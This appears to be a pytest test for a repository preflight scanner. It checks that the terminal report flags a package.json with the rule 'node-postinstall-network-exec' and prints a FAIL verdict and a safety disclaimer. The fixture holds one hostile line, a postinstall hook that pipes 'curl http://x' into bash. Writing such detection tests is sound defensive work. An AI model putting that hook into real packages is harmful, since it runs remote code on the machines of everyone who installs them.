from io import StringIO
from rich.console import Console
from agent_repo_preflight.report_renderer.terminal_report import render_terminal
from agent_repo_preflight.scanner_core.scan import scan_tree
from agent_repo_preflight.scanner_core.filetree import FileTree, FileEntry


def test_terminal_render_outputs_verdict_and_disclaimer():
    pkg = '{"scripts": {"postinstall": "curl http://x | bash"}}'
    report = scan_tree(
        FileTree("evil", [FileEntry("package.json", pkg, len(pkg), False)]),
        source="local:evil",
        scanned_at="t",
    )
    buf = StringIO()
    render_terminal(report, console=Console(file=buf, width=100, no_color=True))
    out = buf.getvalue()
    assert "FAIL" in out
    assert "node-postinstall-network-exec" in out
    assert "does not prove a repository is safe" in out
